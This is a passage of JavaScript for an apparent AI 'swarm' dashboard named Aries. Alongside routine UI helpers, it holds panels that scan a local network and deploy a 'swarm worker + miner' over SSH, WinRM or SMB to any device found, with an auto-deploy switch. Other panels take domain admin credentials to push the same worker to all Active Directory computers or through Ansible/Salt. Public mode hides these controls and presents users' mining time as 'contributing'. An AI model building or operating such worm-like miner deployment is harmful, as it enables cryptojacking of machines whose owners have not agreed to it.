  function downloadCSV(filename, headers, rows) { var csv = headers.join(',') + '\n'; for (var i = 0; i < rows.length; i++) csv += rows[i].map(function(c) { return '"' + String(c).replace(/"/g, '""') + '"'; }).join(',') + '\n'; downloadText(filename, csv); }
  function exportSwarmCSV() { api('GET', 'status').then(function(d) { var nodes = (d.swarm || {}).nodes || {}, keys = Object.keys(nodes); downloadCSV('swarm.csv', ['Node','Status','Model'], keys.map(function(k) { var n = nodes[k]; return [k, n.status || '', n.model || '']; })); toast('Exported', 'success'); }).catch(function() {}); }
  function exportNetworkCSV() { toast('Export from network panel', 'info'); }
  function exportPnlCSV() { api('GET', 'miner/pnl').then(function(d) { downloadCSV('pnl.csv', ['BTC','USD'], [[d.totalBtcMined || 0, d.totalUsd || 0]]); }).catch(function() {}); }

  // ═══════════════════════════════
  //  SIDEBAR UPTIME
  // ═══════════════════════════════
  var _bootTime = Date.now();
  function updateSidebarUptime() { var el = document.getElementById('sidebarUptime'); if (!el) return; var s = Math.floor((Date.now() - _bootTime) / 1000); el.textContent = '\u23F1 ' + formatUptime(s); }

  // ═══════════════════════════════
  //  NAV BADGES
  // ═══════════════════════════════
  function updateNavBadge(panel, value) {
    var item = document.querySelector('.nav-item[data-panel="' + panel + '"]'); if (!item) return;
    var badge = item.querySelector('.nav-badge');
    if (!value || value === 0 || value === '0') { if (badge) badge.remove(); return; }
    if (!badge) { badge = document.createElement('span'); badge.className = 'nav-badge'; item.appendChild(badge); }
    badge.textContent = String(value);
  }
  function refreshBadges() {
    api('GET', 'status', null, {}).then(function(d) {
      var sw = d.swarm || {};
      var online = Object.values(sw.nodes || {}).filter(function(n) { return n.status === 'active'; }).length;
      updateNavBadge('swarm', online || '');
      updateNavBadge('agents', d.totalAgents || sw.totalAgents || '');
      // Update top bar stat chips
      setText('statAgents', String(d.totalAgents || d.agentTypes || sw.totalAgents || 0));
      setText('statWorkers', String(d.totalWorkers || d.workers || sw.totalWorkers || 0));
      setText('statUptime', formatUptime(d.uptime || 0));
      // Update model badge on load
      var badge = document.getElementById('activeModelBadge');
      if (badge && d.model && !badge._userSet) {
        var modelName = String(d.model).split('/').pop();
        badge.textContent = modelName || 'cloud';
        badge.title = 'Configured model: ' + d.model;
      }
      // Update CPU/RAM if available
      if (d.cpu != null) setText('statCpu', d.cpu + '%');
      if (d.memUsed != null && d.memTotal != null && d.memTotal > 0) {
        setText('statRam', Math.round(d.memUsed / d.memTotal * 100) + '%');
      }
    }).catch(function() {});
  }

  // ═══════════════════════════════
  //  WORKER OPTIMIZATION GRID
  // ═══════════════════════════════
  function refreshWorkerOptGrid() {
    api('GET', 'swarm/workers', null, {}).then(function(d) {
      var grid = document.getElementById('workerOptGrid');
      if (!grid || !d.workers) return;
      if (d.workers.length === 0) { grid.innerHTML = '<div style="color:#666;font-size:13px;">No workers connected</div>'; return; }
      grid.innerHTML = d.workers.map(function(w) {
        var statusColor = w.status === 'online' ? '#0f0' : (w.status === 'mining-only' ? '#ff0' : (w.status === 'throttled' ? '#f44' : '#666'));
        var statusLabel = w.status === 'online' ? 'mining+ai' : w.status;
        var opt = w.optimization || {};
        var specs = w.specs || {};
        var load = w.load || {};
        return '<div style="background:#111;border:1px solid ' + statusColor + '33;border-radius:8px;padding:12px;font-size:12px;">' +
          '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">' +
            '<strong style="color:var(--accent);">' + escapeHtml(w.hostname || w.id) + '</strong>' +
            '<span style="color:' + statusColor + ';font-size:11px;">● ' + escapeHtml(statusLabel) + '</span>' +
          '</div>' +
          '<div style="color:#aaa;line-height:1.6;">' +
            '💾 ' + (specs.ram_gb || '?') + 'GB RAM · ' + (specs.cores || '?') + ' cores<br>' +
            '🧠 ' + escapeHtml(opt.model || 'none') + ' (' + (opt.ollamaAgents || 0) + ' agents)<br>' +
            '⛏️ ' + escapeHtml(opt.miningIntensity || '?') + ' · ' + (opt.miningThreads || '?') + ' threads' +
            (opt.currentThrottle && opt.currentThrottle !== 'none' ? '<br>⚠️ Throttled: ' + escapeHtml(opt.currentThrottle) : '') +
          '</div>' +
          (load.cpu ? '<div style="margin-top:6px;font-size:11px;color:#888;">CPU ' + load.cpu + '% · RAM ' + load.ram + '% · Disk ' + load.disk + '%</div>' : '') +
          '<div style="margin-top:6px;font-size:10px;color:#555;">' + escapeHtml(w.optimizationLabel || '') + '</div>' +
        '</div>';
      }).join('');
    }).catch(function() {});
  }
  // Auto-refresh worker grid every 15s
  setInterval(refreshWorkerOptGrid, 15000);
  setTimeout(refreshWorkerOptGrid, 2000);

  // ═══════════════════════════════
  //  HELPERS
  // ═══════════════════════════════
  function escapeHtml(str) { return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;'); }
  function formatUptime(s) { if (s < 60) return s + 's'; if (s < 3600) return Math.floor(s / 60) + 'm'; return Math.floor(s / 3600) + 'h ' + Math.floor((s % 3600) / 60) + 'm'; }
  function formatBytes(b) { if (b < 1024) return b + ' B'; if (b < 1048576) return (b / 1024).toFixed(1) + ' KB'; return (b / 1048576).toFixed(1) + ' MB'; }

  // ═══════════════════════════════
  //  TRON BOOT ANIMATION
  // ═══════════════════════════════
  function runBootAnimation() {
    if (sessionStorage.getItem('aries-booted')) return;
    sessionStorage.setItem('aries-booted', '1');

    var screen = document.getElementById('bootScreen');
    if (!screen) return;
    screen.style.display = 'flex';

    var lines = [
      { text: '> ARIES v7.0 CORE INITIALIZING...', delay: 0 },
      { text: '> LOADING KERNEL MODULES..........', delay: 300 },
      { text: '> AI GATEWAY: ONLINE', delay: 600 },
      { text: '> SWARM NETWORK: CONNECTED', delay: 900 },
      { text: '> MEMORY BANKS: LOADED', delay: 1150 },
      { text: '> RAG ENGINE: READY', delay: 1350 },
      { text: '> SENTINEL: WATCHING', delay: 1550 },
      { text: '> CRYPTO MINER: STANDBY', delay: 1700 },
      { text: '> BROWSER CONTROL: ACTIVE', delay: 1850 },
      { text: '> ALL SYSTEMS NOMINAL \u26A1', delay: 2100 }
    ];

    var terminal = screen.querySelector('.boot-terminal');
    var progress = screen.querySelector('.boot-progress-fill');
    var logo = screen.querySelector('.boot-logo');

    if (logo) setTimeout(function() { logo.classList.add('visible'); }, 100);

    lines.forEach(function(line, idx) {
      setTimeout(function() {
        var div = document.createElement('div');
        div.className = 'boot-line';
        div.textContent = line.text;
        terminal.appendChild(div);
        if (progress) progress.style.width = ((idx + 1) / lines.length * 100) + '%';
      }, line.delay);
    });

    // Fade out and remove
    setTimeout(function() {
      screen.classList.add('boot-fade-out');
      setTimeout(function() { screen.remove(); }, 600);
    }, 3000);
  }

  // ═══════════════════════════════
  //  INIT
  // ═══════════════════════════════
  function initPublicMode() {
    // Check if admin mode via config or localStorage override
    _adminMode = localStorage.getItem('aries-admin-mode') === 'true';

    api('GET', 'config').then(function(d) {
      var cfg = d.config || d || {};
      if (cfg.adminMode === true) {
        _adminMode = true;
        localStorage.setItem('aries-admin-mode', 'true');
      }
      applyUiMode();
    }).catch(function() {
      applyUiMode();
    });

    // Check Aries network membership
    api('GET', 'swarm/worker/status').then(function(d) {
      if (d.enrolled) {
        _ariesNetworkJoined = true;
        var nav = document.getElementById('navAriesAi');
        if (nav) nav.style.display = '';
      }
    }).catch(function() {});
  }

  function applyUiMode() {
    var adminEls = document.querySelectorAll('[data-admin="true"]');
    for (var i = 0; i < adminEls.length; i++) {
      adminEls[i].style.display = _adminMode ? '' : 'none';
    }
    // Update title for public mode
    if (!_adminMode) {
      document.title = 'Aries AI';
    } else {
      document.title = 'ARIES v8.1 \u2014 Command Center';
    }
  }

  function loadAriesAi() {
    var el = document.getElementById('ariesAiStats');
    if (!el) return;
    el.innerHTML = '<div class="spinner"></div>';
    Promise.all([
      api('GET', 'swarm/worker/status').catch(function() { return {}; }),
      api('GET', 'ares/status').catch(function() { return {}; }),
      api('GET', 'ares/model').catch(function() { return {}; }),
      api('GET', 'ares/growth').catch(function() { return { projection: {} }; }),
      api('GET', 'ares/credits').catch(function() { return { breakdown: {} }; })
    ]).then(function(results) {
      var worker = results[0], status = results[1], model = results[2], growth = results[3], credits = results[4];
      var w = worker.worker || {};
      var tier = w.tier || 'FREE';
      var totalCredits = w.credits || 0;
      var uptime = worker.uptime || 0;
      var tasks = w.tasksCompleted || worker.tasksCompleted || 0;

      _ariesTier = tier;
      _ariesCredits = totalCredits;

      var tierColors = { FREE: '#6b7280', CONTRIBUTOR: '#06b6d4', TRAINER: '#f59e0b', CORE: '#ef4444' };
      var tierColor = tierColors[tier] || '#6b7280';

      var html = '';

      // Your stats
      html += '<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin-bottom:24px;text-align:center">';
      html += '<div style="background:#111;padding:16px;border-radius:10px;border:1px solid ' + tierColor + '33"><div style="font-size:24px;font-weight:bold;color:' + tierColor + '">' + escapeHtml(tier) + '</div><div style="font-size:11px;color:#888;margin-top:4px">Your Tier</div></div>';
      html += '<div style="background:#111;padding:16px;border-radius:10px;border:1px solid #1a1a2e"><div style="font-size:24px;font-weight:bold;color:#0ff">' + Math.round(totalCredits) + '</div><div style="font-size:11px;color:#888;margin-top:4px">Credits</div></div>';

      var h = Math.floor(uptime / 3600), m = Math.floor((uptime % 3600) / 60);
      html += '<div style="background:#111;padding:16px;border-radius:10px;border:1px solid #1a1a2e"><div style="font-size:24px;font-weight:bold;color:#0f0">' + (h > 0 ? h + 'h ' : '') + m + 'm</div><div style="font-size:11px;color:#888;margin-top:4px">Contributed</div></div>';
      html += '<div style="background:#111;padding:16px;border-radius:10px;border:1px solid #1a1a2e"><div style="font-size:24px;font-weight:bold;color:#f0f">' + tasks + '</div><div style="font-size:11px;color:#888;margin-top:4px">AI Tasks Done</div></div>';
      html += '</div>';

      // Tier progression
      html += '<div style="background:#111;padding:20px;border-radius:10px;border:1px solid #1a1a2e;margin-bottom:24px;text-align:left">';
      html += '<h3 style="margin:0 0 12px;color:var(--accent);font-size:14px">Tier Progression</h3>';
      var tiers = ['FREE', 'CONTRIBUTOR', 'TRAINER', 'CORE'];
      var tierIdx = tiers.indexOf(tier);
      html += '<div style="display:flex;gap:4px;margin-bottom:8px">';
      for (var t = 0; t < tiers.length; t++) {
        var tc = tierColors[tiers[t]];
        var active = t <= tierIdx;
        html += '<div style="flex:1;height:6px;border-radius:3px;background:' + (active ? tc : '#222') + ';transition:background 0.3s"></div>';
      }
      html += '</div>';
      html += '<div style="display:flex;justify-content:space-between;font-size:10px;color:#666">';
      for (var t2 = 0; t2 < tiers.length; t2++) {
        html += '<span style="color:' + (t2 <= tierIdx ? tierColors[tiers[t2]] : '#444') + '">' + tiers[t2] + '</span>';
      }
      html += '</div></div>';

      // Model stats
      html += '<div style="background:#111;padding:20px;border-radius:10px;border:1px solid #1a1a2e;margin-bottom:24px;text-align:left">';
      html += '<h3 style="margin:0 0 12px;color:var(--accent);font-size:14px">&#x1F9E0; Collective Model</h3>';
      html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">';
      html += '<div><div style="color:#888;font-size:11px">Effective Parameters</div><div style="font-size:18px;font-weight:bold;color:#0ff">' + escapeHtml(model.effective_params_human || '70B') + '</div></div>';
      html += '<div><div style="color:#888;font-size:11px">Training Cycles</div><div style="font-size:18px;font-weight:bold;color:#0f0">' + (model.cycle || 0) + '</div></div>';
      html += '</div></div>';

      // Growth chart
      var proj = growth.projection || {};
      if (proj.projections && proj.projections.length > 0) {
        html += '<div style="background:#111;padding:20px;border-radius:10px;border:1px solid #1a1a2e;margin-bottom:24px;text-align:left">';
        html += '<h3 style="margin:0 0 12px;color:var(--accent);font-size:14px">&#x1F4C8; Growth — Getting Smarter Over Time</h3>';
        html += '<div style="display:flex;gap:4px;align-items:flex-end;height:80px">';
        var maxP = 0;
        for (var pi = 0; pi < proj.projections.length; pi++) { if (proj.projections[pi].effectiveParams > maxP) maxP = proj.projections[pi].effectiveParams; }
        for (var pj = 0; pj < proj.projections.length; pj++) {
          var p = proj.projections[pj];
          var barH = maxP > 0 ? Math.max(5, Math.round((p.effectiveParams / maxP) * 70)) : 5;
          html += '<div style="flex:1;display:flex;flex-direction:column;align-items:center">';
          html += '<div style="font-size:10px;color:var(--accent)">' + (p.effectiveParamsHuman || '') + '</div>';
          html += '<div style="width:100%;height:' + barH + 'px;background:linear-gradient(to top,var(--accent),#0f0);border-radius:2px"></div>';
          html += '<div style="font-size:10px;color:#666;margin-top:4px">M' + (p.month || pj + 1) + '</div></div>';
        }
        html += '</div></div>';
      }

      // Messaging
      html += '<div style="background:linear-gradient(135deg,#0a1a2a,#0a0a1a);padding:20px;border-radius:10px;border:1px solid #0ff3;text-align:center">';
      html += '<div style="font-size:16px;color:#0ff;font-weight:600;margin-bottom:8px">You\'re helping build this &#x26A1;</div>';
      html += '<div style="color:#888;font-size:13px">Every hour you contribute makes Aries smarter for everyone. The model grows with the community.</div>';
      html += '</div>';

      el.innerHTML = html;
    });
  }

  function init() {
    // Apply saved theme
    var savedTheme = localStorage.getItem('aries-theme');
    if (savedTheme) document.documentElement.setAttribute('data-theme', savedTheme);

    // Run boot animation first
    runBootAnimation();

    // Initialize public/admin mode
    initPublicMode();

    api('GET', 'status').then(function(d) {
      window._ariesVersion = d.version || '8.1';
      document.querySelectorAll('.version, .version-footer').forEach(function(el) { el.textContent = 'v' + window._ariesVersion; });
      if (_adminMode) document.title = 'ARIES v' + window._ariesVersion + ' \u2014 Command Center';
    }).catch(function() {});

    initNav();
    initChat();
    initGlobalSearch();
    initKeyboardShortcuts();
    initEasterEggs();
    initContextMenus();
    connectWS();
    // Don't eagerly load swarm - it will lazy-load when user clicks the tab
    // Boot animation handles the visual boot - no need for chat boot message
    showWelcomeScreen();
    checkAutoUpdate();
    refreshBadges();
    // Polling intervals - pause when browser tab is hidden
    var _pollTimers = [];
    function smartInterval(fn, ms) {
      var id = setInterval(function() { if (!document.hidden) fn(); }, ms);
      _pollTimers.push(id);
      return id;
    }
    smartInterval(pollNotifications, 30000);
    smartInterval(refreshBadges, 30000);
    setInterval(updateSidebarUptime, 1000);
    updateSidebarUptime();

    // Expose API
    // ── Network Auto-Deploy Functions ──
    function networkScan() {
      var btn = document.getElementById('netScanBtn');
      if (btn) btn.textContent = '⏳ Scanning...';
      api('GET', 'network/deploy/scan').then(function(data) {
        if (btn) btn.textContent = '🔍 Scan Network';
        var el = document.getElementById('netDeployDevices');
        if (!el) return;
        var devices = data.devices || [];
        if (devices.length === 0) { el.innerHTML = '<div style="color:var(--text-dim)">No deployable devices found on network.</div>'; return; }
        var html = '<table style="width:100%;border-collapse:collapse;font-size:12px"><thead><tr style="border-bottom:1px solid var(--border)"><th style="text-align:left;padding:4px">IP</th><th>Hostname</th><th>OS</th><th>Ports</th><th>Status</th><th>Action</th></tr></thead><tbody>';
        for (var i = 0; i < devices.length; i++) {
          var d = devices[i];
          var statusColor = d.deployed ? 'var(--green)' : 'var(--text-dim)';
          var statusText = d.deployed ? '✓ Deployed' : 'Ready';
          var method = d.openPorts.indexOf(22) >= 0 ? 'ssh' : (d.openPorts.indexOf(5985) >= 0 ? 'winrm' : 'smb');
          html += '<tr style="border-bottom:1px solid var(--border)">';
          html += '<td style="padding:4px;font-family:monospace;color:var(--accent)">' + escapeHtml(d.ip) + '</td>';
          html += '<td style="padding:4px">' + escapeHtml(d.hostname || '-') + '</td>';
          html += '<td style="padding:4px">' + escapeHtml(d.osGuess || '?') + '</td>';
          html += '<td style="padding:4px">' + d.openPorts.join(', ') + '</td>';
          html += '<td style="padding:4px;color:' + statusColor + '">' + statusText + '</td>';
          html += '<td style="padding:4px">' + (d.deployed ? '-' : '<button class="btn-sm" onclick="window.aries.netDeploy(\'' + d.ip + '\',\'' + method + '\')">Deploy</button>') + '</td>';
          html += '</tr>';
        }
        html += '</tbody></table>';
        el.innerHTML = html;
      }).catch(function(e) {
        if (btn) btn.textContent = '🔍 Scan Network';
        toast('Scan failed: ' + (e.message || e), 'error');
      });
    }
    function netDeploy(ip, method) {
      if (!confirm('Deploy swarm worker + miner to ' + ip + ' via ' + method + '?')) return;
      toast('Deploying to ' + ip + '...', 'info');
      api('POST', 'network/deploy', { ip: ip, method: method }).then(function(r) {
        if (r.success) { toast('Deployed to ' + ip + '!', 'success'); networkScan(); }
        else toast('Deploy failed: ' + (r.error || 'Unknown'), 'error');
      }).catch(function(e) { toast('Deploy error: ' + (e.message || e), 'error'); });
    }
    function setNetAutoDeploy(enabled) {
      api('POST', 'network/auto-deploy', { enabled: enabled }).then(function(r) {
        toast('Auto-deploy ' + (r.autoDeployEnabled ? 'enabled' : 'disabled'), 'success');
      }).catch(function(e) { toast('Error: ' + (e.message || e), 'error'); });
    }
    function showNetDeployLog() {
      api('GET', 'network/deploy/log').then(function(r) {
        var logText = r.log || 'No log entries yet.';
        var w = window.open('', 'netDeployLog', 'width=700,height=500');
        w.document.write('<pre style="font-family:monospace;font-size:12px;padding:16px;background:#111;color:#0f0;white-space:pre-wrap">' + logText.replace(/</g, '&lt;') + '</pre>');
      }).catch(function(e) { toast('Error: ' + (e.message || e), 'error'); });
    }

    // ═══ AD Deploy (Active Directory) ═══
    function loadAdDeploy() {
      var el = document.getElementById('adDeployContent');
      if (!el) return;
      el.innerHTML = '<p style="color:var(--dim)">Loading...</p>';
      api('GET', 'ad/status').then(function(st) {
        var html = '';
        // Connect form
        html += '<div class="info-card" style="margin-bottom:16px"><h3>&#x1F3E2; Active Directory Connection</h3>';
        if (st.connected) {
          html += '<div style="margin:12px 0"><span style="color:var(--green);font-size:18px">&#x25CF; Connected to <b>' + (st.domain || '?') + '</b></span></div>';
        }
        html += '<div style="display:grid;grid-template-columns:1fr 1fr 1fr auto;gap:8px;margin-top:12px">';
        html += '<input id="adDomain" class="input-field" placeholder="Domain (e.g. corp.local)" value="' + (st.domain || '') + '" />';
        html += '<input id="adUser" class="input-field" placeholder="Username (DOMAIN\\admin)" />';
        html += '<input id="adPass" class="input-field" type="password" placeholder="Password" />';
        html += '<button class="btn-primary" onclick="window.aries.adConnect()">&#x1F50C; Connect</button>';
        html += '</div></div>';
        // Status cards
        html += '<div style="display:grid;grid-template-columns:repeat(5,1fr);gap:12px;margin-bottom:16px">';
        html += '<div class="info-card" style="text-align:center"><div style="font-size:28px;color:var(--accent)">' + (st.computerCount || 0) + '</div><div style="font-size:11px;color:var(--dim)">Computers</div></div>';
        html += '<div class="info-card" style="text-align:center"><div style="font-size:28px;color:var(--green)">' + (st.deployed || 0) + '</div><div style="font-size:11px;color:var(--dim)">Deployed</div></div>';
        html += '<div class="info-card" style="text-align:center"><div style="font-size:28px;color:var(--red)">' + (st.failed || 0) + '</div><div style="font-size:11px;color:var(--dim)">Failed</div></div>';
        html += '<div class="info-card" style="text-align:center"><div style="font-size:28px;color:var(--yellow,#ffa)">' + (st.pending || 0) + '</div><div style="font-size:11px;color:var(--dim)">Pending</div></div>';
        var total = (st.deployed || 0) + (st.failed || 0) + (st.pending || 0);
        var pct = total > 0 && st.computerCount > 0 ? Math.round((st.deployed || 0) / st.computerCount * 100) : 0;
        html += '<div class="info-card" style="text-align:center"><div style="font-size:28px;color:var(--accent)">' + pct + '%</div><div style="font-size:11px;color:var(--dim)">Coverage</div></div>';
        html += '</div>';
        // Progress bar
        if (total > 0) {
          html += '<div style="background:var(--bg2);border-radius:6px;height:8px;margin-bottom:16px;overflow:hidden"><div style="height:100%;width:' + pct + '%;background:linear-gradient(90deg,var(--green),var(--accent));transition:width 0.5s"></div></div>';
        }
        // Filter + actions
        html += '<div class="info-card" style="margin-bottom:16px"><h3>&#x1F4E1; Deploy Controls</h3>';
        html += '<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin:12px 0">';
        html += '<input id="adFilterOU" class="input-field" placeholder="Filter by OU (optional)" />';
        html += '<input id="adFilterName" class="input-field" placeholder="Name pattern (regex)" />';
        html += '<input id="adFilterOS" class="input-field" placeholder="OS filter (e.g. Windows 10)" />';
        html += '</div>';
        html += '<div style="display:flex;gap:8px;margin-top:8px">';
        html += '<button class="btn-primary" onclick="window.aries.adListComputers()" ' + (st.connected ? '' : 'disabled') + '>&#x1F50D; List Computers</button>';
        html += '<button class="btn-primary" onclick="window.aries.adDeployAll()" ' + (st.connected ? '' : 'disabled') + ' style="background:var(--green);color:#000">&#x1F680; Deploy to All</button>';
        html += '<button class="btn-sm" onclick="window.aries.adDeploySelected()" ' + (st.connected ? '' : 'disabled') + '>Deploy Selected</button>';
        html += '<button class="btn-sm" onclick="window.aries.refreshAdDeploy()">&#x1F504; Refresh</button>';
        html += '</div></div>';
        // Computer list
        html += '<div class="info-card"><h3>&#x1F4BB; Domain Computers</h3>';
        html += '<div id="adComputerList" style="margin-top:8px">';
        var machines = st.machines || {};
        var names = Object.keys(machines);
        if (names.length === 0) {
          html += '<p style="color:var(--dim)">Click "List Computers" to enumerate domain PCs.</p>';
        } else {
          html += '<table style="width:100%;font-size:12px;border-collapse:collapse">';
          html += '<tr style="color:var(--dim);text-align:left"><th style="padding:6px"><input type="checkbox" id="adSelectAll" onchange="window.aries._adToggleAll(this.checked)" /></th><th style="padding:6px">Computer</th><th style="padding:6px">Status</th><th style="padding:6px">Time</th><th style="padding:6px">Action</th></tr>';
          for (var i = 0; i < names.length; i++) {
            var n = names[i], m = machines[n];
            var statusHtml = m.status === 'deployed' ? '<span style="color:var(--green)">&#x2714; Deployed</span>' : m.status === 'failed' ? '<span style="color:var(--red)">&#x2716; Failed</span>' : m.status === 'deploying' ? '<span style="color:var(--accent)">&#x23F3; Deploying...</span>' : '<span style="color:var(--dim)">' + m.status + '</span>';
            var timeStr = m.finishedAt ? new Date(m.finishedAt).toLocaleString() : m.startedAt ? new Date(m.startedAt).toLocaleString() : '-';
            html += '<tr style="border-top:1px solid var(--border)"><td style="padding:6px"><input type="checkbox" class="ad-pc-check" value="' + n + '" /></td><td style="padding:6px;font-family:monospace">' + n + '</td><td style="padding:6px">' + statusHtml + '</td><td style="padding:6px;font-size:11px;color:var(--dim)">' + timeStr + '</td><td style="padding:6px"><button class="btn-sm" style="font-size:10px" onclick="window.aries.adDeployOne(\'' + n.replace(/'/g, "\\'") + '\')">Deploy</button></td></tr>';
          }
          html += '</table>';
        }
        html += '</div></div>';
        el.innerHTML = html;
      }).catch(function(e) {
        el.innerHTML = '<p style="color:var(--red)">Error loading AD status: ' + e.message + '</p>';
      });
    }

    function adConnect() {
      var domain = document.getElementById('adDomain').value;
      var user = document.getElementById('adUser').value;
      var pass = document.getElementById('adPass').value;
      if (!domain) { toast('Enter a domain name', 'error'); return; }
      api('POST', 'ad/connect', { domain: domain, username: user, password: pass }).then(function() {
        toast('Connected to ' + domain, 'success');
        loadAdDeploy();
      }).catch(function(e) { toast('AD connect failed: ' + e.message, 'error'); });
    }

    function adListComputers() {
      var ou = document.getElementById('adFilterOU').value;
      var namePattern = document.getElementById('adFilterName').value;
      var os = document.getElementById('adFilterOS').value;
      var qs = [];
      if (ou) qs.push('ou=' + encodeURIComponent(ou));
      if (namePattern) qs.push('namePattern=' + encodeURIComponent(namePattern));
      if (os) qs.push('os=' + encodeURIComponent(os));
      var el = document.getElementById('adComputerList');
      if (el) el.innerHTML = '<p style="color:var(--dim)">&#x23F3; Enumerating domain computers...</p>';
      api('GET', 'ad/computers' + (qs.length ? '?' + qs.join('&') : '')).then(function(r) {
        var comps = r.computers || [];
        if (comps.length === 0) { if (el) el.innerHTML = '<p style="color:var(--dim)">No computers found.</p>'; return; }
        var h = '<table style="width:100%;font-size:12px;border-collapse:collapse">';
        h += '<tr style="color:var(--dim);text-align:left"><th style="padding:6px"><input type="checkbox" id="adSelectAll" onchange="window.aries._adToggleAll(this.checked)" /></th><th style="padding:6px">Name</th><th style="padding:6px">DNS</th><th style="padding:6px">OS</th><th style="padding:6px">Action</th></tr>';
        for (var i = 0; i < comps.length; i++) {
          var c = comps[i];
          var name = c.DNSHostName || c.Name;
          h += '<tr style="border-top:1px solid var(--border)"><td style="padding:6px"><input type="checkbox" class="ad-pc-check" value="' + name + '" /></td><td style="padding:6px;font-family:monospace">' + (c.Name || '') + '</td><td style="padding:6px;font-size:11px">' + (c.DNSHostName || '') + '</td><td style="padding:6px;font-size:11px">' + (c.OperatingSystem || '?') + '</td><td style="padding:6px"><button class="btn-sm" style="font-size:10px" onclick="window.aries.adDeployOne(\'' + name.replace(/'/g, "\\'") + '\')">Deploy</button></td></tr>';
        }
        h += '</table>';
        h += '<div style="margin-top:8px;font-size:12px;color:var(--dim)">' + comps.length + ' computers found</div>';
        if (el) el.innerHTML = h;
        toast(comps.length + ' computers found', 'success');
      }).catch(function(e) { toast('List failed: ' + e.message, 'error'); });
    }

    function _adGetFilter() {
      var f = {};
      var ou = document.getElementById('adFilterOU');
      var nm = document.getElementById('adFilterName');
      var os = document.getElementById('adFilterOS');
      if (ou && ou.value) f.ou = ou.value;
      if (nm && nm.value) f.namePattern = nm.value;
      if (os && os.value) f.os = os.value;
      return f;
    }

    function adDeployAll() {
      if (!confirm('Deploy Aries worker to ALL domain computers?')) return;
      toast('Starting mass deployment...', 'info');
      api('POST', 'ad/deploy', _adGetFilter()).then(function(r) {
        toast('Deployment complete: ' + (r.deployed || 0) + ' deployed, ' + (r.failed || 0) + ' failed', r.failed ? 'warning' : 'success');
        loadAdDeploy();
      }).catch(function(e) { toast('Deploy failed: ' + e.message, 'error'); });
    }

    function adDeploySelected() {
      var checks = document.querySelectorAll('.ad-pc-check:checked');
      if (checks.length === 0) { toast('Select computers first', 'error'); return; }
      var count = checks.length;
      if (!confirm('Deploy to ' + count + ' selected computers?')) return;
      var done = 0, fail = 0;
      for (var i = 0; i < checks.length; i++) {
        (function(name) {
          api('POST', 'ad/deploy/' + encodeURIComponent(name)).then(function(r) {
            if (r.ok) done++; else fail++;
            if (done + fail === count) {
              toast('Done: ' + done + ' deployed, ' + fail + ' failed', fail ? 'warning' : 'success');
              loadAdDeploy();
            }
          }).catch(function() { fail++; if (done + fail === count) { toast('Done: ' + done + ' deployed, ' + fail + ' failed', 'warning'); loadAdDeploy(); } });
        })(checks[i].value);
      }
    }

    function adDeployOne(name) {
      toast('Deploying to ' + name + '...', 'info');
      api('POST', 'ad/deploy/' + encodeURIComponent(name)).then(function(r) {
        toast(r.ok ? name + ' deployed!' : name + ' failed: ' + (r.error || 'unknown'), r.ok ? 'success' : 'error');
        loadAdDeploy();
      }).catch(function(e) { toast('Deploy failed: ' + e.message, 'error'); });
    }

    function _adToggleAll(checked) {
      var boxes = document.querySelectorAll('.ad-pc-check');
      for (var i = 0; i < boxes.length; i++) boxes[i].checked = checked;
    }

    // ═══ Fleet Deploy (Ansible/Salt) ═══
    var _fleetLog = [];
    function loadFleetDeploy() {
      api('GET', 'fleet/status').then(function(st) {
        var panel = document.getElementById('panel-fleet-deploy');
        if (!panel) return;
        var html = '<h2>&#x1F680; Fleet Deployer</h2>';
        html += '<div class="card" style="margin-bottom:16px">';
        html += '<h3>Status</h3>';
        html += '<div>Running: <span class="' + (st.running ? 'text-warn' : 'text-success') + '">' + (st.running ? 'Yes' : 'Idle') + '</span>';
        html += ' | Deployed: ' + (st.deployed || 0);
        if (st.lastRun) html += ' | Last: ' + st.lastRun.time;
        html += '</div></div>';

        // Host list
        html += '<div class="card" style="margin-bottom:16px"><h3>Hosts (' + (st.hosts || []).length + ')</h3>';
        html += '<table class="data-table"><tr><th>Name</th><th>IP</th><th>User</th></tr>';
        (st.hosts || []).forEach(function(h) {
          html += '<tr><td>' + h.name + '</td><td>' + (h.ansible_host || '-') + '</td><td>' + (h.ansible_user || '-') + '</td></tr>';
        });
        html += '</table></div>';

        // Add host form
        html += '<div class="card" style="margin-bottom:16px"><h3>Add Host</h3>';
        html += '<input id="fleetIp" placeholder="IP address" style="width:140px;margin-right:8px">';
        html += '<input id="fleetUser" placeholder="User (root)" style="width:100px;margin-right:8px">';
        html += '<input id="fleetKey" placeholder="SSH key path (optional)" style="width:180px;margin-right:8px">';
        html += '<button class="btn-primary" onclick="window.aries.fleetAddHost()">Add</button></div>';

        // Deploy controls
        html += '<div class="card" style="margin-bottom:16px"><h3>Deploy</h3>';
        html += '<select id="fleetMethod" style="margin-right:8px"><option value="ansible">Ansible</option><option value="salt">Salt</option></select>';
        html += '<input id="fleetTags" placeholder="Tags (install,configure,start)" style="width:200px;margin-right:8px">';
        html += '<button class="btn-primary" onclick="window.aries.fleetDeploy()">&#x1F680; Deploy</button></div>';

        // Log
        html += '<div class="card"><h3>Progress Log</h3>';
        html += '<pre id="fleetLog" style="max-height:300px;overflow:auto;background:var(--bg-darker);padding:8px;font-size:12px">';
        html += _fleetLog.join('\n') || '(no output yet)';
        html += '</pre></div>';

        panel.innerHTML = html;
      }).catch(function() {});
    }

    function fleetAddHost() {
      var ip = document.getElementById('fleetIp').value.trim();
      var user = document.getElementById('fleetUser').value.trim() || 'root';
      var keyPath = document.getElementById('fleetKey').value.trim() || undefined;
      if (!ip) return toast('IP required', 'error');
      api('POST', 'fleet/add-host', { ip: ip, user: user, keyPath: keyPath }).then(function(r) {
        if (r.ok) { toast('Host added', 'success'); _loadedPanels['fleet-deploy'] = false; loadFleetDeploy(); }
        else toast(r.error || 'Failed', 'error');
      }).catch(function(e) { toast(e.message, 'error'); });
    }

    function fleetDeploy() {
      var method = document.getElementById('fleetMethod').value;
      var tags = document.getElementById('fleetTags').value.trim() || undefined;
      _fleetLog = ['[' + new Date().toLocaleTimeString() + '] Starting deploy via ' + method + '...'];
      var logEl = document.getElementById('fleetLog');
      if (logEl) logEl.textContent = _fleetLog[0];
      api('POST', 'fleet/deploy', { method: method, tags: tags }).then(function(r) {
